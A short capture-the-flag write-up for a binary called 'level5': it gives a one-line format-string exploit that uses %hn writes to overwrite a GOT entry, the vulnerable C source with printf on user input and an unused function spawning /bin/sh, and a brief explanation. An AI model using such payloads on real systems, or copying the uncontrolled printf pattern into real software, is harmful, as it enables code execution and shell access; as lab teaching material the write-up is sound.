(python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"'; cat) | ./level5

this is another binary that has format string but with another twist.

```c
void    o() {
    system("/bin/sh");
    _exit(1);
}

void    n() {
    char    buff[520];

    fgets(buff, 512, stdin);
    printf(buff);

    exit(1);
}

int main(void) {
    n();
}
```

as you can see the o function is never called so we have to reach it somehow.
buffer overflow is out of the question because the program uses fgets with a length smaller than the buffer size

we will be introduced to a new concept which is overwriting the `GOT`
